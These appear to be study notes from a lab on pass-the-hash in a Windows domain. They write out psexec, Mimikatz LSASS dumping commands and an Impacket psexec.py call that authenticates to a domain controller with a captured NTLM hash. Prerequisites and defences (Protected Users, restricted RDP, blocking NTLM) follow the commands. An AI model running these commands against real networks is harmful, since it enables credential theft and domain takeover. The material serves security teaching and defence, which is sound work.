psexec.exe \\SRV01 cmd.exe -accepteula

mimikatz.exe
privilege::debug
sekurlsa::msv

python.exe psexec.py -hashes :e9cea451b61bd792681893d48f9683b9 CONTOSO/v.fergusson.adm@192.168.1.11 cmd.exe
This opens a command prompt on 192.168.1.11 (aka **DC01**) and we used to hash of Vickie during the logon process.

### Extract the hash from the LSASS memory 
	▪  This requires the seDebugPrivilege 
	▪ Requires that the targeted identity has cached its credentials 
### Inject the hash into your current session 
	▪ Either locally, or later on other systems 
	▪ The “new” hash is used to calculate NTLM responses 
### Does not trigger any failed authentication attempts

Attack’s pre-requisites - A victim is connected to the system, or a service is running under a user account - seDebugPrivilege, or LSASS memory dump

Protection - Healthy administration practices (do not connect to untrusted systems with privileged accounts, use RDP restricted mode) - Use the Protected Users group (for privileged accounts) - Block NTLM on systems where it is not used (very difficult in large environments)

